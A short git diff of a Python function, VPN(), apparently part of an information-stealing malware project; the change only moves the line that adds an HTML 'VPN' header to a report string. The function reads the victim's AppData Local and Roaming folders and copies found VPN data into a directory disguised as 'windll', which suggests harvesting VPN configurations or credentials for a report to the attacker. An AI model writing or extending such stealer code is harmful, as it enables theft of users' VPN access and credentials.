@@ -18,6 +18,7 @@ from manager.logger import Log
 
 def VPN():
     data= ""
+    data += "\n\n\n<b>📡VPN📡</b>"
     Log("===========VPN===========")
     local = environ['USERPROFILE'] + sep + r'AppData\Local'
     appdata = environ['USERPROFILE'] + sep + r'AppData\Roaming'
@@ -44,7 +45,6 @@ def VPN():
     
     if logs:
             try:
-                data += "\n\n\n<b>📡VPN📡</b>"
                 mkdir(rf'{local}\windll\VPN')
                 for key, value in logs.items():
                     mkdir(rf'{local}\windll\VPN/'+key+'\\')
